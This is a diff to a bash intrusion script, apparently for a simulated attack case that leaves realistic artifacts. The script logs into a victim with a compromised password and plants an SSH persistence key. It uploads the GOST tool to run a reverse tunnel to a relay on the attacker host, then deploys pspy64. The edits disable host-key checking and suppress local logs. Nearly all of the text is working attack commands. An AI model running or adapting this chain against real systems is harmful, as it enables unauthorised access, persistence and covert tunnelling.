@@ -13,8 +13,6 @@ LOCAL_GOST_PATH="${ATTACK_HOME}/gost"
 LOCAL_PSPY_PATH="${ATTACK_HOME}/pspy64"
 PERSIST_KEY="${ATTACK_HOME}/keys/case7_persistence_key"
 
-GOST_SERVER_LOG="${ATTACK_HOME}/gost-server.log"
-
 # ================================================
 # Compromised account
 # ================================================
@@ -77,8 +75,9 @@ fi
 # ================================================
 # Local GOST relay on attacker
 # ================================================
+# На r2 ничего не пишем: ни .pid, ни log-файлы.
 
-nohup "${LOCAL_GOST_PATH}" -L "relay://${ATTACKER_IP}:9002?bind=true" > "${GOST_SERVER_LOG}" 2>&1 &
+nohup "${LOCAL_GOST_PATH}" -L "relay://${ATTACKER_IP}:9002?bind=true" >/dev/null 2>&1 < /dev/null &
 
 sleep 2
 
@@ -87,13 +86,17 @@ sleep 2
 # ================================================
 
 sshpass -p "${COMPROMISED_PASS}" ssh \
-  -o StrictHostKeyChecking=accept-new \
+  -o StrictHostKeyChecking=no \
+  -o UserKnownHostsFile=/dev/null \
+  -o LogLevel=ERROR \
   "${COMPROMISED_USER}@${VICTIM_IP}" \
   'whoami; hostname'
 
 sshpass -p "${COMPROMISED_PASS}" ssh-copy-id \
   -i "${PERSIST_KEY}.pub" \
-  -o StrictHostKeyChecking=accept-new \
+  -o StrictHostKeyChecking=no \
+  -o UserKnownHostsFile=/dev/null \
+  -o LogLevel=ERROR \
   "${COMPROMISED_USER}@${VICTIM_IP}"
 
 # ================================================
@@ -101,28 +104,37 @@ sshpass -p "${COMPROMISED_PASS}" ssh-copy-id \
 # ================================================
 
 sshpass -p "${COMPROMISED_PASS}" ssh \
-  -o StrictHostKeyChecking=accept-new \
+  -o StrictHostKeyChecking=no \
+  -o UserKnownHostsFile=/dev/null \
+  -o LogLevel=ERROR \
   "${COMPROMISED_USER}@${VICTIM_IP}" \
   "mkdir -p ~/.local/bin"
 
 sshpass -p "${COMPROMISED_PASS}" scp \
-  -o StrictHostKeyChecking=accept-new \
+  -o StrictHostKeyChecking=no \
+  -o UserKnownHostsFile=/dev/null \
+  -o LogLevel=ERROR \
   "${LOCAL_GOST_PATH}" \
   "${COMPROMISED_USER}@${VICTIM_IP}:/home/${COMPROMISED_USER}/.local/bin/gost"
 
 sshpass -p "${COMPROMISED_PASS}" ssh \
-  -o StrictHostKeyChecking=accept-new \
+  -o StrictHostKeyChecking=no \
+  -o UserKnownHostsFile=/dev/null \
+  -o LogLevel=ERROR \
   "${COMPROMISED_USER}@${VICTIM_IP}" \
   "chmod +x ~/.local/bin/gost"
 
 # ================================================
 # Remote GOST client on victim
 # ================================================
+# На жертве лог оставляем как реалистичный артефакт атаки.
 
 sshpass -p "${COMPROMISED_PASS}" ssh \
-  -o StrictHostKeyChecking=accept-new \
+  -o StrictHostKeyChecking=no \
+  -o UserKnownHostsFile=/dev/null \
+  -o LogLevel=ERROR \
   "${COMPROMISED_USER}@${VICTIM_IP}" \
-  "nohup ~/.local/bin/gost -L rtcp://127.0.0.1:2223/127.0.0.1:22 -F relay://${ATTACKER_IP}:9002 > ~/gost-client.log 2>&1 &"
+  "nohup ~/.local/bin/gost -L rtcp://127.0.0.1:2223/127.0.0.1:22 -F relay://${ATTACKER_IP}:9002 > ~/gost-client.log 2>&1 < /dev/null &"
 
 sleep 3
 
@@ -135,7 +147,9 @@ ssh \
   -p 2223 \
   -o BatchMode=yes \
   -o PasswordAuthentication=no \
-  -o StrictHostKeyChecking=accept-new \
+  -o StrictHostKeyChecking=no \
+  -o UserKnownHostsFile=/dev/null \
+  -o LogLevel=ERROR \
   "${COMPROMISED_USER}@127.0.0.1" \
   'whoami; hostname'
 
@@ -148,7 +162,9 @@ ssh \
   -p 2223 \
   -o BatchMode=yes \
   -o PasswordAuthentication=no \
-  -o StrictHostKeyChecking=accept-new \
+  -o StrictHostKeyChecking=no \
+  -o UserKnownHostsFile=/dev/null \
+  -o LogLevel=ERROR \
   "${COMPROMISED_USER}@127.0.0.1" \
   "mkdir -p ~/.local/bin"
 
@@ -157,7 +173,9 @@ scp \
   -P 2223 \
   -o BatchMode=yes \
   -o PasswordAuthentication=no \
-  -o StrictHostKeyChecking=accept-new \
+  -o StrictHostKeyChecking=no \
+  -o UserKnownHostsFile=/dev/null \
+  -o LogLevel=ERROR \
   "${LOCAL_PSPY_PATH}" \
   "${COMPROMISED_USER}@127.0.0.1:/home/${COMPROMISED_USER}/.local/bin/pspy64"
 
@@ -166,19 +184,24 @@ ssh \
   -p 2223 \
   -o BatchMode=yes \
   -o PasswordAuthentication=no \
-  -o StrictHostKeyChecking=accept-new \
+  -o StrictHostKeyChecking=no \
+  -o UserKnownHostsFile=/dev/null \
+  -o LogLevel=ERROR \
   "${COMPROMISED_USER}@127.0.0.1" \
   "chmod +x ~/.local/bin/pspy64"
 
 # ================================================
 # Run pspy64 on victim
 # ================================================
+# На жертве pspy.log оставляем как артефакт для анализа.
 
 ssh \
   -i "${PERSIST_KEY}" \
   -p 2223 \
   -o BatchMode=yes \
   -o PasswordAuthentication=no \
-  -o StrictHostKeyChecking=accept-new \
+  -o StrictHostKeyChecking=no \
+  -o UserKnownHostsFile=/dev/null \
+  -o LogLevel=ERROR \
   "${COMPROMISED_USER}@127.0.0.1" \
-  "nohup ~/.local/bin/pspy64 -pf -i 1000 > ~/pspy.log 2>&1 &"
+  "nohup ~/.local/bin/pspy64 -pf -i 1000 > ~/pspy.log 2>&1 < /dev/null &"
